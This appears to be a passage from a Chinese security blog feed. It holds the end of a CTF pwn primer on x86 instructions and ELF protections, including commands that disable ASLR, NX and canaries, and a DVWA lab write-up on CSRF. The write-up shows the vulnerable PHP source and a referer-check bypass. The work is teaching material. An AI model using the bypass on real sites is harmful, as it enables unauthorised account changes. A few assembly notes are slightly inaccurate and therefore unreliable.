<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">add &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">add &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">add &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>sub 操作数，源操作数</strong></p>
<p><code>sub</code>指令指示第一个操作数减去第二个操作数，并将相减后的值保存在第一个操作数，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub &lt;reg&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;reg&gt;		;</span><br><span class="line">sub &lt;reg&gt;,&lt;con&gt;		;</span><br><span class="line">sub &lt;mem&gt;,&lt;con&gt;		;</span><br></pre></td></tr></table></figure></div>

<p><strong>inc 操作数 &amp;&amp; dec 操作数</strong></p>
<p><code>inc</code>，<code>dec</code> 分别表示将操作数自加1，自减1，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">inc &lt;reg&gt;			;</span><br><span class="line">inc &lt;mem&gt;			;</span><br><span class="line">dec &lt;reg&gt;			;</span><br><span class="line">dec &lt;mem&gt;			;</span><br></pre></td></tr></table></figure></div>

<p><strong>imul</strong></p>
<p>整数相乘指令，它有两种指令格式，一种为两个操作数，将两个操作数的值相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器；第二种格式为三个操作数，其语义为：将第二个和第三个操作数相乘，并将结果保存在第一个操作数中，第一个操作数必须为寄存器。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imul &lt;reg&gt;,&lt;reg&gt;		; imul rax, rbx ==&gt; rax = rax * rbx</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;		;</span><br><span class="line">imul &lt;reg&gt;,&lt;reg&gt;,&lt;con&gt;	; imul rax, rbx, 0x10 ==&gt; rax = rbx * 0x10</span><br><span class="line">imul &lt;reg&gt;,&lt;mem&gt;,&lt;con&gt;	;</span><br></pre></td></tr></table></figure></div>

<p><strong>and 操作数，源操作数, or 操作数，源操作数, xor 操作数，源操作数</strong></p>
<p>逻辑与、逻辑或、逻辑异或操作指令，用于操作数的位操作，操作结果放在第一个操作数中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">and &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">and &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">and &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">or &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">or &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">or &lt;mem&gt;,&lt;con&gt;</span><br><span class="line"></span><br><span class="line">xor &lt;reg&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;mem&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;reg&gt;</span><br><span class="line">xor &lt;reg&gt;,&lt;con&gt;</span><br><span class="line">xor &lt;mem&gt;,&lt;con&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>not</strong></p>
<p>位翻转指令，将操作数中的每一位翻转，即0-&gt;1, 1-&gt;0。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">not &lt;reg&gt;</span><br><span class="line">not &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>neg</strong></p>
<p>取负指令。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">neg &lt;reg&gt;</span><br><span class="line">neg &lt;mem&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>SHL、SHR、SAL、SAR: 移位指令</strong></p>
<p>算数移位考虑符号，逻辑移位不考虑。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SHL(Shift Left):             ;逻辑左移</span><br><span class="line">;SHR(Shift Right):            ;逻辑右移</span><br><span class="line">;SAL(Shift Arithmetic Left):  ;算术左移</span><br><span class="line">;SAR(Shift Arithmetic Right): ;算术右移</span><br><span class="line"></span><br><span class="line">;其中的 SHL 和 SAL 相同, 但 SHR 和 SAR 不同.</span><br><span class="line"></span><br><span class="line">;SHL, SAL: 每位左移, 低位补 0,  高位进 CF</span><br><span class="line">;SHR     : 每位右移, 低位进 CF, 高位补 0</span><br><span class="line">;SAR     : 每位右移, 低位进 CF, 高位不变</span><br><span class="line">;它们的结果影响 OF、SF、ZF、PF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">SHL/SHR/SAL/SAR &lt;reg&gt;, CL</span><br><span class="line">SHL/SHR/SAL/SAR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>ROL、ROR、RCL、RCR: 循环移位指令</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ROL(Rotate Left):                循环左移</span><br><span class="line">;ROR(Rotate Right):               循环右移</span><br><span class="line">;RCL(Rotate through Carry Left):  带进位循环左移</span><br><span class="line">;RCR(Rotate through Carry Right): 带进位循环右移</span><br><span class="line"></span><br><span class="line">;ROL: 循环左移, 高位到低位并送 CF</span><br><span class="line">;ROR: 循环右移, 低位到高位并送 CF</span><br><span class="line">;RCL: 循环左移, 进位值(原CF)到低位, 高位进 CF</span><br><span class="line">;RCR: 循环右移, 进位值(原CF)到高位, 低位进 CF</span><br><span class="line"></span><br><span class="line">;它们的结果影响 OF、CF</span><br><span class="line">;它们的指令格式相同:</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, &lt;con8&gt;</span><br><span class="line">ROL/ROR/RCL/RCR &lt;reg&gt;, CL</span><br><span class="line">ROL/ROR/RCL/RCR &lt;mem&gt;, CL</span><br></pre></td></tr></table></figure></div>

<p><strong>jmp 操作数</strong></p>
<p>控制转移到<code>label</code>所指示的地址。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">jump label</span><br></pre></td></tr></table></figure></div>

<p><strong>leave</strong></p>
<p><code>leave</code> 指令等同于两条指令 <code>mov rbp, rsp; pop rbp</code></p>
<p><strong>ret</strong></p>
<p><code>ret</code> 指令等同于 <code>pop rip</code>。</p>
<p><strong>call 操作数</strong></p>
<p><code>call</code> 操作数 <code>call</code> 指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，<code>call</code> 指令保存调用之前的地址信息（当 <code>call</code> 指令结束后，返回到调用之前的地址）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call label		; call label ==&gt; push rdi + 8; jump label; ... ; ret;</span><br></pre></td></tr></table></figure></div>

<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><h3 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h3><p>状态标志用于指示算术运算（例如使用<code>ADD</code>、<code>SUB</code>、<code>MUL</code>、<code>DIV</code>等指令）后的结果，它们包括包括有以下几个标志：</p>
<ul>
<li><code>CF</code>：进位标志（Carry flag）是标志寄存器的第0位，又被称之为<code>CY</code>，当其被设置时表示运算结果的最高有效位发生进位或借位的情况，并在无符号整数的运算中表示运算的溢出状态。</li>
<li><code>PF</code>：奇偶校验标志（Parity flag）是标志寄存器的第2位，当其被设置表示结果中包含偶数个值为1的位，否则表示结果中包含奇数个值为1的位。</li>
<li><code>AF</code>：辅助进位标志（Auxiliary carry flag）是标志寄存器的第4位，当其被设置表示在算术运算中低三位发生进位或借位（例如<code>AL</code>向<code>AH</code>进位或借位）或BCD码算术运算中发生进位或借位的情况。</li>
<li><code>ZF</code>：零标志（Zero flag）是标志寄存器的第6位，当其被设置时运算的结果是否等于0，否则不等于0。</li>
<li><code>SF</code>：符号标志（Sign flag）是标志寄存器的第7位，当其被设置时表示结果为负数，否则为正数。</li>
<li><code>OF</code>：溢出标志（Overflow flag）是标志寄存器的第11位，当其被设置时代表运算结果溢出，即结果超出了能表达的最大范围。</li>
</ul>
<p>状态标志中，只有<code>CF</code>标志能被直接通过<code>STC</code>、<code>CLC</code>以及<code>CMC</code>指令修改。</p>
<h3 id="控制标志"><a href="#控制标志" class="headerlink" title="控制标志"></a>控制标志</h3><ul>
<li><code>DF</code>：方向标志（Direction flag）是标志寄存器的第10位，用于指示串操作指令地址的变化方向。当其被设置时，存储器由自高向低方向变化，否则相反。<code>STD</code>与<code>CLD</code>指令分别用于设置、清除<code>DF</code>标志的值。</li>
</ul>
<h3 id="系统标志"><a href="#系统标志" class="headerlink" title="系统标志"></a>系统标志</h3><ul>
<li><code>TF</code>：陷阱标志（Trap flag）是标志寄存器的第8位，当其被设置时将开启单步调试模式。在其被设置的情况下，每个指令被执行后都将产生一个调试异常，以便于观察指令执行后的情况。</li>
<li><code>IF</code>：中断标志（Interrupt flag）是标志寄存器的第9位，当其被设置时表示CPU可响应可屏蔽中断（maskable interrupt）。</li>
<li><code>IOPL</code>：I&#x2F;O特权级别标志（I&#x2F;O privilege level  flag）是标志寄存器的第12位以及第13位，表示当其程序或任务的I&#x2F;O权限级别。I&#x2F;O权限级别为0～3范围之间的值，通常一般用户程序I&#x2F;O特权级别为0。当前运行程序的CPL（current privilege level）必须小于等于IOPL，否则将发生异常。</li>
<li><code>NT</code>：嵌套任务（Nested task flag）是标志寄存器的第14位，用于控制中断返回指令<code>IRET</code>的执行方式。若被设置则将通过中断的方式执行返回，否则通过常规的堆栈的方式执行。在执行<code>CALL</code>指令、中断或异常处理时，处理器将会设置该标志。</li>
<li><code>RF</code>：恢复标志（Resume flag）是标志寄存器的第16位，用于控制处理器对调试异常的响应。若其被设置则会暂时禁止断点指令产生的调试异常，其复位后断点指令将会产生异常。</li>
<li><code>VM</code>：虚拟8086模式标志（Virtual 8086 mode flag）是标志寄存器的第17位，当其被设置表示启用虚拟8086模式（在保护模式下模拟实模式），否则退回到保护模式工作。</li>
<li><code>AC</code>：对齐检查标志（Alignment check (or access control) flag）是标志寄存器的第18位。当该标志位被设置且<code>CR0</code>寄存器中的<code>AM</code>位被设置时，将对用户态下对内存引用进行对齐检查，在存在未对齐的操作数时产生异常。</li>
<li><code>VIF</code>：虚拟中断标志（Virtual interrupt flag）是标志寄存器的第19位，为<code>IF</code>标志的虚拟映象。该标志与<code>VIP</code>标志一起，且在<code>CR4</code>寄存器中<code>VME</code>或<code>PVI</code>位被设置且<code>IOPL</code>小于3时，处理器才将识别该标志。</li>
<li><code>VIP</code>：虚拟中断挂起标志（Virtual interrupt pending flag）是标志寄存器的第20位，其被设置表示有一个中断被挂起（等待处理），否则表示没有等待处理的中断。该标志通常与<code>VIF</code>标志搭配一起使用。</li>
<li><code>ID</code>：ID标志（Identification flag）是标志寄存器的第21位，通过修改该位的值可以测试是否支持<code>CPUID</code>指令。</li>
</ul>
<h1 id="函数调用栈及ELF相关安全机制"><a href="#函数调用栈及ELF相关安全机制" class="headerlink" title="函数调用栈及ELF相关安全机制"></a>函数调用栈及ELF相关安全机制</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p><strong>x32 函数调用栈：</strong></p>
<p>函数通过栈传参，参数从右到左依次入栈。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32stack.png"
                      alt="x32stack"
                ></p>
<p><strong>x64 函数调用栈：</strong></p>
<p>参数前六个参数从左到右分别为<code>rdi, rsi, rdx, rcx, r8, r9</code>。超过六个参数，多余参数通过栈传参。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64stack.png"
                      alt="x64stack"
                ></p>
<h2 id="ELF相关安全机制"><a href="#ELF相关安全机制" class="headerlink" title="ELF相关安全机制"></a>ELF相关安全机制</h2><p><strong>RELRO</strong></p>
<ul>
<li>简介</li>
</ul>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 <code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code> 为”<code>Partial RELRO</code>，说明我们对 <code>GOT</code> 表具有写权限。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				// 部分开启，即Partial RELRO 重定位表格只读，重定位项可读写</span><br><span class="line">gcc -z now -o test test.c				// 全部开启，重定位表格和重定位项均为只读</span><br></pre></td></tr></table></figure></div>

<p><strong>Canary</strong></p>
<ul>
<li>简介</li>
</ul>
<p>函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证 <code>cookie</code> 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 <code>cookie</code> 信息给覆盖掉，导致栈保护检查失败而阻止 <code>shellcode</code> 的执行。在 <code>Linux</code> 中我们将<code>cookie</code> 信息称为 <code>canary</code>。</p>
<ul>
<li>开启方式：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c						// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></div>

<p><strong>NX</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>NX</code> 即 <code>No-eXecute</code>（不可执行）的意思，<code>NX（DEP）</code>的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 <code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时 <code>CPU</code> 就会抛出异常，而不是去执行恶意指令。</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c					// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c		// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c	// 开启NX保护</span><br></pre></td></tr></table></figure></div>

<p><strong>PIE &amp; ASLR</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>ASLR</code>保护分为三个层级:</p>
<div class="highlight-container" data-rel="Tex"><figure class="iseeu highlight tex"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

<p><code>PIE</code> 保护即位置无关的可执行文件，程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，包含 <code>.bss</code>，<code>.text</code>, <code>.data</code> 等段都会被随机化。</p>
<ul>
<li>开启方式</li>
</ul>
<p><code>PIE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				// 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		// 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></div>

<p><code>ASLE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space # 0 - 表示关闭进程地址空间随机化。</span><br><span class="line">sudo echo 1 &gt; /proc/sys/kernel/randomize_va_space # 1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">sudo echo 2 &gt; /proc/sys/kernel/randomize_va_space # 2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

<p><strong>FORTIFY</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>fority</code> 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
<p>例如 :</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c							// 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c		// 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c		// 较强的检查</span><br></pre></td></tr></table></figure></div>













]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Base_knowledge</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-CSRF</title>
    <url>/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094240554.png"
                      alt="image-20231011094240554"
                ></p>
<p>没有做任何防护。直接输入新密码即可。</p>
<ul>
<li>抓包查看</li>
</ul>
<p>将密码修改为 <code>123456</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094451943.png"
                      alt="image-20231011094451943"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011095446264.png"
                      alt="image-20231011095446264"
                ></p>
<ul>
<li>Attack</li>
</ul>
<p><code>URL</code> 就是一个 <code>GET</code> 请求。诱骗用户点击此链接即可就会在用户不知情的情况下修改密码为 <code>123456</code>。</p>
<ol>
<li>拦截请求后，右击请求界面，选择生成CSRF PoC</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011102256026.png"
                      alt="image-20231011102256026"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103354780.png"
                      alt="image-20231011103354780"
                ></p>
<ol start="2">
<li>点击用浏览器中测试。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103421274.png"
                      alt="image-20231011103421274"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103930091.png"
                      alt="image-20231011103930091"
                ></p>
<p>复制弹出来的 <code>URL</code> ，将<code>burpsuite</code> 改为 <code>ip:8080</code> 比如 <code>127.0.0.1:8080</code>，访问这个 <code>URL</code> 将会自动跳转到修改密码 <code>URL</code> ，并修改密码为 <code>123456</code>。</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $current_user = dvwaCurrentUser();</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>检测机制：在修改密码等敏感操作时，会检测 <code>referer</code> 请求来源地址，里面是否存在主机 <code>ip</code> 或域名。我们可以构造一个有效的 <code>Referer</code>，可以在攻击服务器上创建一个新的 <code>html</code> 页面，命名时 要含有 <code>csrf</code> 网站主机 <code>ip</code> 地址。所以这对本地搭建的无影响。我们通过回环和局域网 <code>Ip</code> 的方式来进行测试。</p>
<p>假如服务器地址为 <code>192.168.66.66</code>，即为 <code>SERVER_NAME</code>，我们只需要把我们构造的恶意页面文件名改为 <code>192.168.66.66.html</code>，<code>HTTP_REFERER</code>就会包含<code>192.168.66.66.html</code>,就可以绕过 <code>stripos</code>了。</p>
<ul>
<li>Attack</li>
</ul>
<ol>
<li>通过本地 <code>IP</code> 访问 <code>dvwa</code> 页面，利用 <code>burp</code> 抓包，并制作 <code>CSRF PoC</code>。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145844804.png"
                      alt="image-20231012145844804"
                ></p>
<ol start="2">
<li>复制 <code>HTML</code> 代码，并将其命名为<code>192.168.56.1</code> 放在 <code>WWW</code> 目录下。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145945233.png"
                      alt="image-20231012145945233"
                ></p>
<ol start="3">
<li>放行原来的包将密码改回 <code>password</code>，通过回环访问本地的<code>192.168.56.1.html</code>文件并抓包。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150205921.png"
                      alt="image-20231012150205921"
                ></p>
<p>可以看见 <code>referer</code> 和 <code>host</code> 的地址并不相同，我们将 <code>referer</code> 指向 攻击者服务器地址即 <code>192.168.56.1.html</code>即可绕过。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150452551.png"
                      alt="image-20231012150452551"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150521082.png"
                      alt="image-20231012150521082"
                ></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
<li>源码</li>
</ul>
